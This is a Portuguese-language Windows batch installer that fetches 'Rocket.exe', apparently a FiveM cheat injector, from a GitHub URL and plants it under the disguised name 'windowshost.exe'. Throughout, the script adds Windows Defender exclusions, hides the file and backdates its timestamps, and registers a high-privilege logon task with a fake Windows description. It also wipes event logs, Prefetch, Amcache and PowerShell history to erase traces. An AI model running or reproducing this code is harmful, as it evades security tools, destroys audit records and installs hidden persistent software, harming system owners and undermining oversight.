@echo off
:: ========================================
::  INSTALADOR ROCKET - VERSÃO ROBUSTA
::  Rocket.exe + install.bat = 100% Funcional
::  Limpa rastros e funciona via CMD
:: ========================================

title Instalador Rocket
color 0A

:: Verificar Windows 10/11
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Requer Windows 10 ou 11!
    pause
    exit /b 1
)

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    pause
    exit /b 1
)

:: Configurações
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

:: Criar pasta
if not exist "%PASTA%" mkdir "%PASTA%" >nul 2>&1

echo.
echo ========================================
echo    INSTALADOR ROCKET - VERSAO ROBUSTA
echo ========================================
echo.

:: ========================================
:: [1/6] LIMPEZA COMPLETA PRIMEIRO
:: ========================================
echo [1/6] Limpando processos e tarefas antigas...

taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1

schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"

timeout /t 2 /nobreak >nul
echo [OK] Limpeza concluida!
echo.

:: ========================================
:: [2/6] VERIFICAR/BAIXAR ROCKET.EXE
:: ========================================
echo [2/6] Verificando Rocket.exe...

:: Verificar se Rocket.exe existe localmente (na mesma pasta do install.bat)
set "LOCAL_ROCKET=%~dp0Rocket.exe"
if exist "%LOCAL_ROCKET%" (
    echo [INFO] Rocket.exe encontrado localmente!
    echo [INFO] Copiando Rocket.exe local...
    if exist "%CAMINHO%" (
        attrib -s -h "%CAMINHO%" >nul 2>&1
        del /q /f "%CAMINHO%" >nul 2>&1
        timeout /t 1 /nobreak >nul
    )
    copy /y "%LOCAL_ROCKET%" "%CAMINHO%" >nul 2>&1
    if exist "%CAMINHO%" (
        echo [OK] Rocket.exe copiado com sucesso!
        goto :ROCKET_OK
    ) else (
        echo [AVISO] Falha ao copiar Rocket.exe local, tentando baixar do GitHub...
    )
)

:: Tentar baixar do GitHub
echo [INFO] Tentando baixar Rocket.exe do GitHub...
powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; try { $r=Invoke-WebRequest -Uri $url -UseBasicParsing -Method Head -TimeoutSec 15 -ErrorAction Stop; Write-Host '[OK] Rocket.exe encontrado no GitHub!' -ForegroundColor Green; exit 0 } catch { Write-Host '[ERRO] Rocket.exe NAO encontrado no GitHub!' -ForegroundColor Red; Write-Host 'URL: ' $url -ForegroundColor Yellow; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Nao foi possivel encontrar Rocket.exe!
    echo [INFO] Opcoes:
    echo   1. Coloque Rocket.exe na mesma pasta do install.bat
    echo   2. Ou suba Rocket.exe para GitHub: unknow2/main/Rocket.exe
    echo.
    pause
    exit /b 1
)

echo [3/6] Baixando Rocket.exe do GitHub...

if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; $out='%CAMINHO%'; try { $ProgressPreference='SilentlyContinue'; Write-Host '     Baixando...' -NoNewline; $response=Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path $out) { $file=Get-Item $out; $size=$file.Length; if ($size -gt 1000) { Write-Host ' [OK]' -ForegroundColor Green; Write-Host '[OK] Download concluido! Tamanho: ' $size ' bytes' -ForegroundColor Green; exit 0 } else { Write-Host ' [ERRO] Arquivo muito pequeno!' -ForegroundColor Red; Remove-Item $out -Force -ErrorAction SilentlyContinue; exit 1 } } else { Write-Host ' [ERRO] Arquivo nao criado!' -ForegroundColor Red; exit 1 } } catch { Write-Host ' [ERRO]' -ForegroundColor Red; Write-Host '[ERRO] Falha no download!' -ForegroundColor Red; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Falha no download!
    pause
    exit /b 1
)

:ROCKET_OK
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao foi encontrado/copiado!
    pause
    exit /b 1
)

echo.

:: ========================================
:: [4/6] CONFIGURAR ARQUIVO
:: ========================================
echo [4/6] Configurando arquivo...

:: Verificar se arquivo existe antes de configurar
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao existe! Nao e possivel configurar.
    pause
    exit /b 1
)

:: Adicionar exclusao do Windows Defender ANTES de ocultar
echo     Configurando Windows Defender...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%CAMINHO%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue; Write-Host 'SUCCESS' } catch { Write-Host 'FAILED' }"

:: Aplicar atributos ocultos
attrib +s +h "%CAMINHO%" >nul 2>&1

:: Configurar outros atributos
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2) } } catch { }"

:: Verificar novamente se arquivo ainda existe
timeout /t 1 /nobreak >nul
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo foi deletado pelo Windows Defender ou antivirus!
    echo [INFO] Adicione a pasta nas excecoes do antivirus:
    echo     %PASTA%
    echo.
    echo [INFO] Tentando restaurar arquivo...
    goto :ROCKET_OK
)

echo [OK] Arquivo configurado e protegido!
echo [INFO] Arquivo esta oculto (normal - atributos +s +h)
echo [INFO] Use VERIFICAR_INSTALACAO.bat para verificar
echo.

:: ========================================
:: [5/6] CRIAR TAREFA AGENDADA
:: ========================================
echo [5/6] Criando tarefa agendada...

timeout /t 2 /nobreak >nul

if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao existe! Nao e possivel criar tarefa.
    pause
    exit /b 1
)

:: Verificar se já existe e deletar
schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% equ 0 (
    echo     Removendo tarefa antiga...
    schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
    timeout /t 2 /nobreak >nul
)

:: Método 1: schtasks (mais confiável)
echo     Tentando metodo schtasks...
schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0030 /f >nul 2>&1
set "SCHTASKS_RESULT=%errorLevel%"

timeout /t 3 /nobreak >nul
set "TASK_CREATED=0"
for /L %%i in (1,1,10) do (
    schtasks /query /tn "%TAREFA%" >nul 2>&1
    if %errorLevel% equ 0 (
        set "TASK_CREATED=1"
        goto :TASK_VERIFIED
    )
    timeout /t 1 /nobreak >nul
)

:TASK_VERIFIED
if %TASK_CREATED% equ 1 (
    echo [OK] Tarefa agendada criada e confirmada via schtasks!
    echo [INFO] Configurada para executar no logon
    echo [INFO] Delay de 30 segundos apos logon
    echo.
    goto :TASK_DONE
)

:: Método 2: PowerShell (fallback)
echo     Tentando metodo PowerShell...
powershell -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; try { $action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force | Out-Null; Write-Host 'SUCCESS' } catch { Write-Host 'FAILED: ' $_.Exception.Message; exit 1 }"

if %errorLevel% equ 0 (
    timeout /t 3 /nobreak >nul
    for /L %%i in (1,1,10) do (
        schtasks /query /tn "%TAREFA%" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Tarefa agendada criada e confirmada via PowerShell!
            goto :TASK_DONE
        )
        timeout /t 1 /nobreak >nul
    )
)

:: Método 3: XML (último recurso)
echo     Tentando metodo XML...
powershell -ExecutionPolicy Bypass -Command "$xml='<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><RegistrationInfo><Date>2020-01-01T00:00:00</Date><Description>Componente de Host de Aplicativos do Windows</Description></RegistrationInfo><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger></Triggers><Principals><Principal id=\"Author\"><UserId>%USERNAME%</UserId><RunLevel>Highest</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>false</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings><Actions Context=\"Author\"><Exec><Command>%CAMINHO%</Command></Exec></Actions></Task>'; $xmlFile='%TEMP%\task_rocket.xml'; $xml | Out-File -FilePath $xmlFile -Encoding Unicode -Force; $result=schtasks /create /tn '%TAREFA%' /xml $xmlFile /f 2>&1; Remove-Item $xmlFile -Force -ErrorAction SilentlyContinue; if ($LASTEXITCODE -eq 0) { Write-Host 'SUCCESS' } else { Write-Host 'FAILED'; exit 1 }"

if %errorLevel% equ 0 (
    timeout /t 3 /nobreak >nul
    for /L %%i in (1,1,10) do (
        schtasks /query /tn "%TAREFA%" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Tarefa agendada criada e confirmada via XML!
            goto :TASK_DONE
        )
        timeout /t 1 /nobreak >nul
    )
)

:: Se todos os métodos falharam
echo [ERRO] Todos os metodos falharam ao criar tarefa!
echo [INFO] Verificando detalhes do erro...
echo.
echo [DEBUG] Caminho do arquivo: %CAMINHO%
echo [DEBUG] Nome da tarefa: %TAREFA%
echo [DEBUG] Usuario: %USERNAME%
echo.
echo [SOLUCAO] Tente executar manualmente:
echo   schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0030 /f
echo.
set "TASK_CREATED=0"

:TASK_DONE

:TASK_DONE

:: ========================================
:: [6/6] LIMPAR TODOS OS RASTROS
:: ========================================
echo [6/6] Limpando todos os rastros do sistema...

:: Limpar Prefetch
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-Item 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*ROCKET*' -or $_.Name -like '*RKT*' -or $_.Name -like '*WINDOWSHOST*' -or $_.Name -like '*ZERO*' } | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }"

:: Limpar Event Logs
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-EventLog -LogName Application,System,Security -ErrorAction SilentlyContinue | ForEach-Object { Clear-EventLog -LogName $_.Log.Log -ErrorAction SilentlyContinue } } catch { }"

:: Limpar histórico do PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Clear-History -ErrorAction SilentlyContinue; $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue } } catch { }"

:: Limpar Amcache
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Remove-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache' -Name '*' -ErrorAction SilentlyContinue; Remove-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache' -Name '*' -ErrorAction SilentlyContinue } catch { }"

:: Limpar cache do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { certutil -urlcache * delete 2>&1 | Out-Null; Remove-Item \"$env:LOCALAPPDATA\IconCache.db\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:LOCALAPPDATA\Microsoft\Windows\Recent\*\" -Force -ErrorAction SilentlyContinue } catch { }"

:: Limpar arquivos temporários relacionados
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\task_rocket.xml" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1

echo [OK] Limpeza de rastros concluida!
echo.

:: ========================================
:: VERIFICAÇÃO FINAL
:: ========================================
echo.
echo [VERIFICACAO] Verificando instalacao...
set "INSTALL_OK=1"

:: Verificar se arquivo existe (mesmo oculto)
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao encontrado: %CAMINHO%
    echo [INFO] O arquivo pode ter sido deletado pelo Windows Defender
    echo [INFO] Adicione a pasta nas excecoes: %PASTA%
    set "INSTALL_OK=0"
) else (
    echo [OK] Arquivo encontrado: %CAMINHO%
    echo [INFO] Arquivo esta oculto (atributos +s +h) - isso e normal!
    echo [INFO] Use VERIFICAR_INSTALACAO.bat para verificar detalhes
    for %%A in ("%CAMINHO%") do (
        if %%~zA LSS 1000 (
            echo [ERRO] Arquivo muito pequeno: %%~zA bytes
            set "INSTALL_OK=0"
        ) else (
            echo [OK] Tamanho do arquivo: %%~zA bytes
        )
    )
)

schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% neq 0 (
    echo [AVISO] Tarefa agendada nao encontrada
    set "INSTALL_OK=0"
) else (
    echo [OK] Tarefa agendada confirmada
)

:: ========================================
:: CONCLUSÃO
:: ========================================
echo.
echo ========================================
if %INSTALL_OK% equ 1 (
    echo    INSTALACAO CONCLUIDA COM SUCESSO!
) else (
    echo    INSTALACAO CONCLUIDA COM AVISOS!
)
echo ========================================
echo.
echo [OK] Rocket.exe instalado em:
echo     %CAMINHO%
echo.
echo [OK] Tarefa agendada: %TAREFA%
echo [OK] O Rocket sera executado 30 segundos
echo      apos o proximo logon
echo.
echo [INFO] Ordem de uso:
echo    1. Reinicie o PC
echo    2. Aguarde 30 segundos apos logon
echo    3. Abra o Spotify e toque: GHARD - Pinheiros
echo    4. Abra o FiveM
echo    5. Aguarde alguns segundos para a injecao
echo    6. Pressione INSERT para abrir o menu
echo.
echo [INFO] Rastros limpos:
echo    - Prefetch
echo    - Event Logs
echo    - PowerShell History
echo    - Amcache
echo    - Cache do Windows
echo    - Arquivos temporarios
echo.
if %INSTALL_OK% neq 1 (
    echo [AVISO] Alguns avisos foram encontrados.
    echo         Se tiver problemas, execute o instalador novamente.
    echo.
)
echo Pressione qualquer tecla para fechar...
pause >nul
exit
